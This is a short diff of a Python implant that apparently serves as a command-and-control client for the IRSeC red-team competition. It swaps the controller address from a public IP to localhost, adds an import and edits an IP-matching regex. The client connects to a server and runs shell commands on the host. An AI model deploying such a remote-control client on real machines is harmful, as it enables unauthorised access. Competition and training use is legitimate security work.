@@ -2,6 +2,7 @@ import socket, subprocess, os, sys, random
 from threading import Thread
 from time import sleep
 import random, re
+import time
 
 
 #######
@@ -69,7 +70,7 @@ try: #If the user does not have this input, skip it
 except:
     pass
 
-SERVER_HOST = "129.21.49.57" #DEFAULT SERVER HOST
+SERVER_HOST = "127.0.0.1" #DEFAULT SERVER HOST
 SERVER_PORT = 8080 #DEFAULT SERVER PORT
 BUFFER_SIZE = 1024 * 128 #128KB max size
 
@@ -238,7 +239,7 @@ def clientLoop():
                     else:
                         out = subprocess.run("ip a | grep inet", shell=True,capture_output=True,text=True).stdout
                 regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 172.X.X.X, or 10.X.X.X
-                regex_cloud = re.compile(r'(172\.\d{1,2}\.\d{1,3}\.\d{1,3})')
+                regex_cloud = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})')
                 out = str(out).strip()
                 try:
                     IP = regex.search(out)[0] #try to find local IP
